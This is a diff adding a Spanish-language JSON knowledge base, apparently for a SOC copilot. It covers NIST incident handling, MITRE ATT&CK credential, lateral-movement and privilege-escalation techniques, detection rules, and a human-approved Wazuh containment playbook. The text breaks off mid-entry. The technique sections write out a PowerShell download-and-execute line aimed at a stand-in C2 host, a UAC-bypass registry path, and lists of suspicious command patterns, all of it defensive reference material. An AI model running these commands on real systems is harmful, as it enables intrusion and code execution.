@@ -1,0 +1,237 @@
+{
+  "vector_size": 256,
+  "documents": [
+    {
+      "id": "nist-incident-handling",
+      "content": "NIST SP 800-61 Rev 2: preparar, detectar, analizar, contener, erradicar, recuperar y aprender. Cuando hay uso indebido de credenciales, priorizar confirmación del usuario, aislar la cuenta, revisar sesiones activas y bloquear fuentes sospechosas con aprobación humana.",
+      "metadata": {
+        "source": "NIST",
+        "theme": "incident_response",
+        "document_title": "NIST SP 800-61 Incident Handling"
+      }
+    },
+    {
+      "id": "mitre-t1110",
+      "content": "MITRE ATT&CK T1110 Brute Force: el atacante intenta adivinar credenciales o probar combinaciones de usuario y contraseña. Recomendado bloquear IP, activar MFA, limitar intentos y revisar logs de autenticación para detectar patrones de fuerza bruta.",
+      "metadata": {
+        "source": "MITRE",
+        "technique": "T1110",
+        "document_title": "MITRE ATT&CK T1110"
+      }
+    },
+    {
+      "id": "mitre-t1078",
+      "content": "MITRE ATT&CK T1078 Valid Accounts: adversarios reutilizan credenciales válidas, a menudo desde horarios inusuales o IPs no habituales. Se recomienda revisar sesión, revocar tokens, cambiar contraseñas y validar si la actividad corresponde a un usuario real.",
+      "metadata": {
+        "source": "MITRE",
+        "technique": "T1078",
+        "document_title": "MITRE ATT&CK T1078"
+      }
+    },
+    {
+      "id": "soc-hardening",
+      "content": "Hardening SOC: aplicar MFA obligatorio, controles de sesión, monitorización de IPs anómalas, alertas sobre accesos en horas extrañas y orden de contención con sign-off humano.",
+      "metadata": {
+        "source": "SOC",
+        "theme": "hardening",
+        "document_title": "SOC Hardening Guidelines"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s1",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 1. Introducción y Marco Operativo\n\n## 1. Introducción y Marco Operativo\nLa publicación especial NIST SP 800-61 Rev 2 (Computer Security Incident Handling Guide) establece el estándar de referencia global para la estructuración y operación de Equipos de Respuesta a Incidentes de Seguridad de la Información (CSIRT / SOC). Su objetivo es minimizar la pérdida de datos, salvaguardar la continuidad operativa y asegurar la preservación admisible de evidencia forense mediante un ciclo estructurado y continuo.",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "1. Introducción y Marco Operativo",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s2",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 2. Fase 1: Preparación (Preparation)\n\n## 2. Fase 1: Preparación (Preparation)\nLa preparación es la piedra angular de una defensa eficaz antes de que ocurra cualquier brecha de seguridad.\n- **Políticas y Procedimientos:** Definición rigurosa de líneas base de seguridad, políticas de uso aceptable, matrices de escalamiento formal y acuerdos de nivel de servicio (SLA) para triaje.\n- **Herramientas de Adquisición y Análisis:** Despliegue de sensores de EDR/SIEM (Wazuh, Sysmon, Auditd), analizadores de tráfico (Zeek, Suricata) y utilidades forenses de memoria y disco.\n- **Kit Forense Jump-Bag:** Medios extraíbles de sólo lectura con software de adquisición forense (FTK Imager CLI, LiME para Linux, WinPmem, KAPE, RegRipper), cables bloqueadores de escritura de hardware (write-blockers) y formularios de cadena de custodia.\n- **Inventario y Clasificación de Activos:** Mapeo de activos críticos (Crown Jewels), controladores de dominio (Active Directory), bases de datos transaccionales, repositorios de código y buckets en la nube.\n- **Entrenamiento y Simulacros:** Ejecución periódica de simulacros en mesa (Tabletop Exercises) y simulaciones de adversarios tipo Purple Team.",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "2. Fase 1: Preparación (Preparation)",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s3",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 3. Fase 2: Detección y Análisis (Detection and Analysis)\n\n## 3. Fase 2: Detección y Análisis (Detection and Analysis)\nLa detección efectiva requiere distinguir entre precursores (signos de que un ataque puede ocurrir en el futuro) e indicadores (señales de que un ataque ya ocurrió o está en curso).\n- **Vectores de Ataque Primarios:** Ataques web (inyecciones SQL, RCE, SSRF), correo electrónico malicioso (phishing, spear-phishing, archivos adjuntos armados), medios extraíbles, suplantación de identidad (spoofing) y compromisos de credenciales válidas.\n- **Análisis y Correlación de Señales:** Correlación en SIEM entre registros de autenticación fallidos, conexiones de red anómalas, creación de procesos sospechosos e integridad de archivos modificados (FIM).\n- **Matrices de Severidad y Priorización:**\n  - *Crítica (P1):* Compromiso de Controlador de Dominio, exfiltración masiva de bases de datos de clientes, propagación activa de ransomware. Tiempo de respuesta objetivo: < 15 minutos.\n  - *Alta (P2):* Compromiso de cuenta administrativa, malware activo en servidor de aplicación sin propagación lateral masiva. Tiempo de respuesta objetivo: < 30 minutos.\n  - *Media (P3):* Múltiples alertas de fuerza bruta contra servicios expuestos bloqueadas en borde, detección de adware o escaneos de puertos no exitosos. Tiempo de respuesta: < 2 horas.\n  - *Baja (P4):* Eventos aislados de escaneo de baja intensidad o anomalías de comportamiento menores. Tiempo de respuesta: < 8 horas.\n- **Documentación Temprana:** Registro minucioso de cada hallazgo en el sistema de tickets del SOC con marcas temporales sincronizadas con NTP fiable.",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "3. Fase 2: Detección y Análisis (Detection and Analysis)",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s4",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 4. Fase 3: Contención, Erradicación y Recuperación (Containment, Eradication, and Recovery)\n\n## 4. Fase 3: Contención, Erradicación y Recuperación (Containment, Eradication, and Recovery)\n- **Estrategia de Contención:**\n  - *Contención a Corto Plazo:* Aislamiento de red del endpoint infectado (mediante reglas iptables locales o comando `host-deny` / `win_route-null` de Wazuh), bloqueo de direcciones IP o dominios maliciosos en firewall perimetral, revocación inmediata de sesiones web activas y deshabilitación provisional de cuentas de usuario comprometidas.\n  - *Contención a Largo Plazo:* Segmentación de subredes, establecimiento de listas de control de acceso (ACLs) restrictivas temporales y redirección de tráfico anómalo a honeypots para inteligencia si procede.\n- **Erradicación de la Amenaza:**\n  - Identificación y neutralización de todos los artefactos del malware (binarios ejecutables, scripts de powershell/bash, tareas programadas de cron/schtasks, claves de registro Run/RunOnce).\n  - Eliminación de canales de comando y control (C2), cierre de puertos no esenciales y remediación de vulnerabilidades explotadas (aplicación de parches de día cero o configuración deficiente).\n- **Recuperación Segura:**\n  - Restauración de sistemas a partir de copias de seguridad limpias e inmutables verificadas previamente contra malware durmiente.\n  - Reemplazo masivo de contraseñas de cuentas afectadas y reinicio de llaves maestras de API y certificados TLS.\n  - Endurecimiento previo al despliegue en producción (Hardening CIS Benchmarks) y monitorización intensiva por 72 horas para verificar ausencia de re-infección.",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "4. Fase 3: Contención, Erradicación y Recuperación (Containment, Eradication, and Recovery)",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s5",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 5. Fase 4: Actividad Post-Incidente (Post-Incident Activity)\n\n## 5. Fase 4: Actividad Post-Incidente (Post-Incident Activity)\n- **Reunión de Lecciones Aprendidas:** Convocada en las 48-72 horas posteriores a la resolución con todos los actores involucrados.\n- **Preguntas Obligatorias:** ¿Qué ocurrió exactamente y a qué hora? ¿Qué tan bien respondieron el personal y los procedimientos? ¿Qué información faltaba en las bitácoras? ¿Qué pasos correctivos prevendrán incidentes similares?\n- **Métricas Clave:**\n  - MTTA (Mean Time to Acknowledge): Tiempo promedio de triaje inicial.\n  - MTTC (Mean Time to Contain): Tiempo transcurrido hasta aislar el vector.\n  - MTTR (Mean Time to Remediate): Tiempo total hasta el restablecimiento normal del servicio.\n- **Retención de Evidencias:** Conservación legal de imágenes forenses, registros de auditoría y reportes durante el período estipulado por normativas sectoriales (e.g. ISO 27001, PCI-DSS, GDPR).",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "5. Fase 4: Actividad Post-Incidente (Post-Incident Activity)",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "01_nist_sp_800_61_rev2_incident_handling-s6",
+      "content": "[NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad] - 6. Preservación Forense y Cadena de Custodia\n\n## 6. Preservación Forense y Cadena de Custodia\n- **Orden de Volatilidad (RFC 3227):** Memoria RAM y buffers de red -> Estado de conexiones -> Almacenamiento en disco -> Medios ópticos y backups.\n- **Adquisición Forense de Memoria:** Volcado en vivo utilizando herramientas confiables (`LiME`, `winpmem`, `DumpIt`) antes de reiniciar o apagar el host para preservar inyectables sin archivo (fileless malware) y claves de cifrado en memoria volátil.\n- **Copias Bit a Bit e Integridad:** Adquisición de discos con `dd` o `dc3dd` validando de forma inmutable mediante cálculo de hashes dobles SHA-256 y MD5 al momento de la captura y previo al análisis.\n- **Formulario de Cadena de Custodia:** Documento formal que certifica quién obtuvo la evidencia, fecha/hora exacta, ubicación física/lógica, motivo del traspaso y custodia ininterrumpida.\n- **Human-in-the-Loop:** Cualquier decisión de contención que implique parada de servicios críticos o alteración irreversible de sistemas debe contar con la validación explícita de un analista o comandante del incidente.",
+      "metadata": {
+        "source": "NIST",
+        "filename": "01_nist_sp_800_61_rev2_incident_handling.md",
+        "section": "6. Preservación Forense y Cadena de Custodia",
+        "document_title": "NIST SP 800-61 Rev 2: Guía de Manejo y Respuesta a Incidentes de Seguridad"
+      }
+    },
+    {
+      "id": "02_mitre_attack_credenciales_y_acceso-s1",
+      "content": "[MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)] - 1. Técnica T1110 - Brute Force (Fuerza Bruta)\n\n## 1. Técnica T1110 - Brute Force (Fuerza Bruta)\nLa técnica T1110 engloba los métodos mediante los cuales los adversarios intentan obtener acceso no autorizado adivinando o descifrando sistemáticamente contraseñas de cuentas de usuario.\n\n### Subtécnicas Detalladas\n- **T1110.001 - Password Guessing (Adivinación de Contraseñas):** El atacante prueba contraseñas de alta probabilidad contra un conjunto reducido de nombres de usuario conocidos (por ejemplo, `admin`, `root`, `soporte`, `backup`). Utiliza diccionarios específicos basados en el nombre de la empresa, estaciones del año o patrones comunes (`Empresa2024!`).\n- **T1110.002 - Password Cracking (Descifrado de Contraseñas):** Descifrado offline de hashes de contraseñas obtenidos previamente a través de volcados de SAM, ntds.dit, Kerberoasting (`T1558.003`) o `/etc/shadow`. Emplea aceleración por GPU (herramientas como Hashcat o John the Ripper) con tablas rainbow o ataques basados en reglas.\n- **T1110.003 - Password Spraying (Rociado de Contraseñas):** Técnica evasiva donde el atacante prueba una única contraseña común (`Invierno2024#`) contra miles de cuentas de dominio. Esto evita intencionalmente activar las políticas de bloqueo por intentos fallidos consecutivos en un solo usuario.\n- **T1110.004 - Credential Stuffing (Relleno de Credenciales):** Uso automatizado de listas masivas de pares usuario/contraseña filtrados en brechas de seguridad públicas externas, aprovechando que los usuarios reutilizan credenciales en múltiples servicios personales y corporativos.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "02_mitre_attack_credenciales_y_acceso.md",
+        "section": "1. Técnica T1110 - Brute Force (Fuerza Bruta)",
+        "document_title": "MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)",
+        "technique": "T1110, T1110.001, T1110.002, T1110.003, T1110.004, T1558.003"
+      }
+    },
+    {
+      "id": "02_mitre_attack_credenciales_y_acceso-s2",
+      "content": "[MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)] - 2. Técnica T1078 - Valid Accounts (Cuentas Válidas)\n\n## 2. Técnica T1078 - Valid Accounts (Cuentas Válidas)\nLos adversarios obtienen y usan credenciales legítimas existentes en la organización para acceder a los sistemas, pasar desapercibidos y eludir controles defensivos basados exclusivamente en firmas de malware.\n\n### Subtécnicas Detalladas\n- **T1078.001 - Default Accounts (Cuentas por Defecto):** Acceso abusando de credenciales predeterminadas de fábrica en enrutadores, switches, firewalls, dispositivos IoT, bases de datos (`sa`, `postgres`) o software empaquetado no modificado tras su instalación.\n- **T1078.002 - Domain Accounts (Cuentas de Dominio):** Compromiso y reutilización de identidades administradas por Active Directory / LDAP. Permite el acceso transversal a recursos de red, carpetas compartidas y aplicaciones corporativas integradas en Kerberos/NTLM.\n- **T1078.003 - Local Accounts (Cuentas Locales):** Uso de credenciales de usuario o administrador configuradas localmente en endpoints o servidores (`Administrator`, `LocalAdmin`). Si la contraseña es homogénea en múltiples equipos, permite movimiento lateral sin interactuar con el controlador de dominio.\n- **T1078.004 - Cloud Accounts (Cuentas en la Nube):** Uso ilegítimo de credenciales de consolas de gestión en AWS, Azure, Google Cloud o Microsoft 365, así como llaves de acceso de Service Accounts o tokens de infraestructura de nube.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "02_mitre_attack_credenciales_y_acceso.md",
+        "section": "2. Técnica T1078 - Valid Accounts (Cuentas Válidas)",
+        "document_title": "MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)",
+        "technique": "T1078, T1078.001, T1078.002, T1078.003, T1078.004"
+      }
+    },
+    {
+      "id": "02_mitre_attack_credenciales_y_acceso-s3",
+      "content": "[MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)] - 3. Indicadores de Compromiso (IoCs) y Detección en Wazuh y SIEM\n\n## 3. Indicadores de Compromiso (IoCs) y Detección en Wazuh y SIEM\n\n### Reglas de Wazuh para Entornos Linux / SSH\n- **Regla 5710:** Fallo de autenticación SSH individual (`Failed password for invalid user` o `Failed password for accepted user`).\n- **Regla 5712:** Detección de ráfaga de intentos fallidos en ventana de tiempo estrecha (típica de T1110.001 o T1110.004). Nivel de alerta 10.\n- **Regla 5716:** Autenticación fallida vía módulo PAM en el sistema operativo.\n- **Regla 5760:** Detección de autenticación exitosa inmediatamente precedida de múltiples intentos fallidos (patrón de compromiso exitoso post-fuerza bruta). Alerta de máxima prioridad en el SOC.\n\n### Event IDs de Windows Security (Auditoría Avanzada)\n- **Event ID 4625 (Logon Failure):** Intento fallido de inicio de sesión.\n  - Código Substatus `0xC000006A`: Nombre de usuario correcto pero contraseña errónea.\n  - Código Substatus `0xC0000064`: Nombre de usuario inexistente (Password Guessing).\n  - Código Substatus `0xC0000234`: La cuenta ha sido bloqueada tras exceder el límite de intentos.\n- **Event ID 4624 (Successful Logon):** Inicio de sesión exitoso. Analizar LogonType:\n  - *Tipo 2:* Interactivo local.\n  - *Tipo 3:* Red (SMB, Kerberos, carpetas compartidas).\n  - *Tipo 10:* RemoteInteractive (RDP - escritorio remoto).\n- **Event ID 4672 (Special Privileges Assigned):** Inicio de sesión asignando privilegios administrativos (`SeDebugPrivilege`, `SeTcbPrivilege`).\n- **Event ID 4776:** Validación de credenciales NTLM en Domain Controller (fallos o éxitos con paquetes NTLM anómalos).\n\n### Patrones de Anomalía Comportamental\n- Intentos de inicio de sesión simultáneos desde ubicaciones geográficas incompatibles (viaje imposible / impossible travel).\n- Inicios de sesión en horarios no operativos (e.g. 03:00 AM) para usuarios con horario de oficina regular.\n- Solicitudes masivas de autenticación originadas desde direcciones IP identificadas como proxies anónimos o nodos de salida Tor.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "02_mitre_attack_credenciales_y_acceso.md",
+        "section": "3. Indicadores de Compromiso (IoCs) y Detección en Wazuh y SIEM",
+        "document_title": "MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)",
+        "technique": "T1110.001, T1110.004"
+      }
+    },
+    {
+      "id": "02_mitre_attack_credenciales_y_acceso-s4",
+      "content": "[MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)] - 4. Mitigaciones y Contramedidas Defensivas\n\n## 4. Mitigaciones y Contramedidas Defensivas\n- **MFA Robusto FIDO2 / WebAuthn:** Obligatoriedad de autenticación multifactor resistente a ataques de intermediario (AiTM) para todos los servicios externos y accesos VPN/RDP.\n- **Bloqueo Inteligente y Rate Limiting:** Configuración de Smart Lockout (como en Azure AD) que bloquea intentos del atacante sin bloquear al usuario legítimo basándose en la reputación de la IP y la huella del navegador.\n- **Integración con Threat Intelligence:** Bloqueo automatizado en gateway perimetral de IPs con mala reputación reportadas por AbuseIPDB, AlienVault OTX o feeds internos del SOC.\n- **Gestión de Cuentas Locales con LAPS:** Despliegue de Windows LAPS para asegurar que cada endpoint mantenga una contraseña de administrador local única, aleatoria y rotada automáticamente.\n- **Deshabilitación de Cuentas por Defecto y Cuentas Huérfanas:** Revisión mensual de cuentas de usuarios inactivos por más de 30 días y desactivación estricta de cuentas de servicio no asignadas.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "02_mitre_attack_credenciales_y_acceso.md",
+        "section": "4. Mitigaciones y Contramedidas Defensivas",
+        "document_title": "MITRE ATT&CK: Técnicas de Acceso Inicial y Compromiso de Credenciales (T1110 y T1078)"
+      }
+    },
+    {
+      "id": "03_mitre_attack_movimiento_lateral_y_escalada-s1",
+      "content": "[MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)] - 1. Técnica T1021 - Remote Services (Servicios Remotos)\n\n## 1. Técnica T1021 - Remote Services (Servicios Remotos)\nLos adversarios se desplazan a través de la red corporativa aprovechando protocolos legítimos de administración y compartición de recursos remotos una vez obtenido un punto de apoyo inicial (Initial Access).\n\n### Subtécnicas Críticas\n- **T1021.001 - Remote Desktop Protocol (RDP - Puerto 3389):** Conexión interactiva a estaciones de trabajo y servidores Windows. Los atacantes utilizan herramientas nativas (`mstsc.exe`) o clientes automatizados (`xfreerdp`, `rdesktop`, `mimikatz ts::`) para acceder gráficamente, transferir archivos mediante portapapeles compartido y saltar entre segmentos de red. Frecuentemente combinado con túneles inversos SSH o proxies SOCKS (`plink.exe`, `chisel`).\n- **T1021.002 - SMB/Windows Admin Shares (Puertos 445 / 139):** Acceso y ejecución remota a través de recursos compartidos administrativos ocultos (`C$`, `ADMIN$`, `IPC$`). Empleado por herramientas como `PsExec`, `WMIexec`, `smbexec`, `Impacket` y scripts de PowerShell para desplegar ejecutables maliciosos y registrar servicios remotos que se ejecutan como `NT AUTHORITY\\SYSTEM`.\n- **T1021.004 - SSH (Secure Shell - Puerto 22):** Desplazamiento lateral en infraestructura Unix/Linux o servidores Windows modernos mediante llaves privadas descubiertas en archivos de configuración (`id_rsa` sin passphrase), robo de llaves en memoria de procesos de agentes SSH (`ssh-agent hijacking`) o fuerza bruta interna de credenciales de servicio.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "03_mitre_attack_movimiento_lateral_y_escalada.md",
+        "section": "1. Técnica T1021 - Remote Services (Servicios Remotos)",
+        "document_title": "MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)",
+        "technique": "T1021, T1021.001, T1021.002, T1021.004"
+      }
+    },
+    {
+      "id": "03_mitre_attack_movimiento_lateral_y_escalada-s2",
+      "content": "[MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)] - 2. Técnica T1059 - Command and Scripting Interpreter (Intérpretes de Comandos y Scripts)\n\n## 2. Técnica T1059 - Command and Scripting Interpreter (Intérpretes de Comandos y Scripts)\nEl adversario abusa de los entornos de comandos e intérpretes nativos instalados en los sistemas operativos para ejecutar código malicioso, evadir listas de bloqueo y evitar dejar binarios en disco (técnicas Living-off-the-Land o LotL).\n\n### Variantes Principales\n- **T1059.001 - PowerShell:** Intérprete potente de Windows. Vectores comunes:\n  - Ejecución codificada para ofuscar payloads: `powershell.exe -enc <Base64>` o `-NoP -NonI -W Hidden -Exec Bypass`.\n  - Descarga directa en memoria: `IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')`.\n  - Abuso de cmdlets administrativos para reconocimiento interno (`Get-ADUser`, `Get-NetComputer`).\n- **T1059.003 - Windows Command Shell (`cmd.exe`):** Ejecución de utilidades nativas para reconocimiento inicial (`whoami /all`, `net user`, `net group \"Domain Admins\" /domain`, `systeminfo`, `route print`).\n- **T1059.004 - Unix Shell (`bash`, `sh`, `zsh`):** Invocación de reverse shells, lectura de archivos sensibles (`/etc/passwd`, `/etc/shadow`, variables de entorno) y orquestación de scripts de persistencia en crontab.\n- **T1059.006 - Python:** Uso de scripts en Python embebidos o descargados para interactuar con APIs internas, escaneo de red local o explotación de vulnerabilidades sin requerir compilación.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "03_mitre_attack_movimiento_lateral_y_escalada.md",
+        "section": "2. Técnica T1059 - Command and Scripting Interpreter (Intérpretes de Comandos y Scripts)",
+        "document_title": "MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)",
+        "technique": "T1059, T1059.001, T1059.003, T1059.004, T1059.006"
+      }
+    },
+    {
+      "id": "03_mitre_attack_movimiento_lateral_y_escalada-s3",
+      "content": "[MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)] - 3. Técnica T1548 - Abuse Elevation Control Mechanism (Abuso de Mecanismos de Elevación)\n\n## 3. Técnica T1548 - Abuse Elevation Control Mechanism (Abuso de Mecanismos de Elevación)\nTécnicas orientadas a elevar privilegios desde una cuenta con permisos limitados hacia el máximo nivel de control (`root` en Linux o `SYSTEM`/`Domain Admin` en Windows).\n\n### Subtécnicas y Vectores de Explotación\n- **T1548.001 - Setuid and Setgid (Linux):** Explotación de binarios que poseen el bit SUID activo con permisos de ejecución como superusuario. Si un binario con SUID vulnerable o listado en GTFOBins (como `find`, `nmap`, `vim`, `bash`) es ejecutado por un usuario no privilegiado, permite generar un shell interactivo con UID 0 (`root`).\n- **T1548.002 - Bypass User Account Control (UAC - Windows):** Elusión del aviso de confirmación de elevación en Windows. Los atacantes abusan de binarios firmados por Microsoft configurados para auto-elevación (auto-elevate), tales como `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe` o `ComputerDefaults.exe`, secuestrando claves de registro en `HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command` para forzar la ejecución de payloads en contexto de integridad Alto.\n- **T1548.003 - Sudo and Sudo Caching (Linux):** Abuso de configuraciones laxas en `/etc/sudoers`. Por ejemplo, permisos `NOPASSWD:` sobre comandos de edición de texto, utilidades de compresión (`tar`, `zip`) o intérpretes de comandos, permitiendo saltar a una shell de root mediante comandos específicos de escape.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "03_mitre_attack_movimiento_lateral_y_escalada.md",
+        "section": "3. Técnica T1548 - Abuse Elevation Control Mechanism (Abuso de Mecanismos de Elevación)",
+        "document_title": "MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)",
+        "technique": "T1548, T1548.001, T1548.002, T1548.003"
+      }
+    },
+    {
+      "id": "03_mitre_attack_movimiento_lateral_y_escalada-s4",
+      "content": "[MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)] - 4. Detección en Wazuh, Sysmon y Auditd\n\n## 4. Detección en Wazuh, Sysmon y Auditd\n\n### Monitorización con Sysmon (Windows)\n- **Sysmon Event ID 1 (Process Creation):**\n  - Detección de procesos hijo anómalos: `svchost.exe` o `spoolsv.exe` ejecutando `cmd.exe` o `powershell.exe`.\n  - Parámetros de línea de comandos sospechosos: `-enc`, `-WindowStyle Hidden`, `DownloadString`, `vssadmin delete shadows`.\n  - Hash del ejecutable contrastado contra bases de reputación de malware.\n- **Sysmon Event ID 3 (Network Connection):**\n  - Conexiones salientes inusuales desde procesos clientes hacia los puertos 445 (SMB) o 3389 (RDP) de otros puestos de trabajo en la misma subred.\n- **Sysmon Event ID 10 (Process Access):**\n  - Procesos no autorizados accediendo a la memoria de `lsass.exe` con derechos `PROCESS_VM_READ` para volcado de credenciales (`Mimikatz`, `Procdump`).\n\n### Reglas de Wazuh y Linux Auditd\n- **Reglas Wazuh 5400-5500:** Auditoría de autenticación y ejecución de comandos `sudo` y `su`. Alerta inmediata si un usuario no autorizado intenta invocar `sudo` o si se registran fallos reiterados en elevación.\n- **Reglas Wazuh FIM (File Integrity Monitoring):** Modificaciones no autorizadas en `/etc/sudoers`, `/etc/sudoers.d/`, `/etc/pam.d/` o archivos de configuración de SSH.\n- **Linux Auditd:** Auditoría de llamadas al sistema `execve` con UID efectivo 0 originadas desde procesos de usuarios estándar.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "03_mitre_attack_movimiento_lateral_y_escalada.md",
+        "section": "4. Detección en Wazuh, Sysmon y Auditd",
+        "document_title": "MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)"
+      }
+    },
+    {
+      "id": "03_mitre_attack_movimiento_lateral_y_escalada-s5",
+      "content": "[MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)] - 5. Endurecimiento (Hardening) y Contención\n\n## 5. Endurecimiento (Hardening) y Contención\n- **Segmentación de Red y Bastión:** Bloqueo de tráfico directo RDP y SMB entre estaciones de trabajo cliente (Microsegmentación). El acceso a servidores de gestión debe forzarse a través de Servidores Bastión / Jump Hosts con autenticación MFA y grabación de sesión.\n- **PowerShell Constrained Language Mode (CLM):** Activación de CLM combinado con políticas WDAC / AppLocker para impedir la invocación de llamadas Win32 API y scripts arbitrarios en memoria.\n- **Políticas Estrictas de Sudoers:** Prohibir el uso de comodines abiertos en `/etc/sudoers` y asegurar que ningún binario que permita escape interactivo pueda ejecutarse con privilegios de root sin contraseña.\n- **Deshabilitación de Servicios Innecesarios:** Desactivación global del protocolo SMBv1 y restricción estricta del servicio Servidor RDP en puestos no destinados a administración técnica.",
+      "metadata": {
+        "source": "MITRE",
+        "filename": "03_mitre_attack_movimiento_lateral_y_escalada.md",
+        "section": "5. Endurecimiento (Hardening) y Contención",
+        "document_title": "MITRE ATT&CK: Movimiento Lateral y Escalada de Privilegios (T1021, T1059 y T1548)"
+      }
+    },
+    {
+      "id": "04_playbooks_wazuh_active_response_y_ransomware-s1",
+      "content": "[Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens] - 1. Playbook 1: Contención con Wazuh Active Response bajo Supervisión Human-in-the-Loop\n\n## 1. Playbook 1: Contención con Wazuh Active Response bajo Supervisión Human-in-the-Loop\n\n### Objetivo y Arquitectura de Respuesta Activa\nEl módulo Active Response de Wazuh permite la ejecución automatizada o teledirigida de scripts correctivos en endpoints cuando se activan reglas de alerta de alto nivel. Para evitar denegaciones de servicio accidentales en infraestructuras productivas, el SOC opera bajo el principio estricto de **Human-in-the-Loop (HITL)** para toda acción destructiva o aislante.\n\n### Comandos de Contención Estandarizados\n- `firewall-drop0` (Linux): Agrega una regla temporal a `iptables` / `nftables` bloqueando todo el tráfico hacia y desde una dirección IP externa hostil identificada.\n- `host-deny` (Linux): Añade la dirección IP agresora a `/etc/hosts.deny` impidiendo conexiones hacia servicios que utilicen TCP Wrappers.\n- `win_route-null` (Windows): Añade una ruta nula (`route add <IP> mask 255.255.255.255 0.0.0.0`) o una regla en Windows Advanced Firewall para neutralizar la comunicación con la dirección IP atacante.\n\n### Protocolo de Decisión y Aprobación Human-in-the-Loop\n1. **Detección y Pre-Validación Automática:**\n   - Wazuh alerta de ataque de fuerza bruta o escaneo persistente (Reglas 5712, 5760 o alertas Nivel >= 10).\n   - El Copilot de IA consulta la reputación de la IP en el Threat Intelligence Service y presenta el dictamen al analista del SOC con score de abuso y geolocalización.\n2. **Evaluación Humana (Gate de Aprobación):**\n   - El analista N1 verifica si la IP pertenece a proveedores legítimos, gateways de sucursales o clientes conocidos (lista blanca corporativa).\n   - Si la IP es ilegítima y el score es crítico (>80%), el analista aprueba la ejecución de la contención.\n3. **Ejecución y Monitoreo:**\n   - Se despacha la orden de bloqueo al agente correspondiente fijando un tiempo de expiración estándar (por defecto 600 segundos para bloqueos temporales, o indefinido con confirmación de N2).\n   - Verificación de la cesación del tráfico hostil en los logs del firewall.",
+      "metadata": {
+        "source": "SOC_PLAYBOOK",
+        "filename": "04_playbooks_wazuh_active_response_y_ransomware.md",
+        "section": "1. Playbook 1: Contención con Wazuh Active Response bajo Supervisión Human-in-the-Loop",
+        "document_title": "Playbooks Operativos del SOC: Wazuh Active Response, Ransomware y Fuga de Tokens"
+      }
+    },
+    {
+      "id": "04_playbooks_wazuh_active_response_y_ransomware-s2",
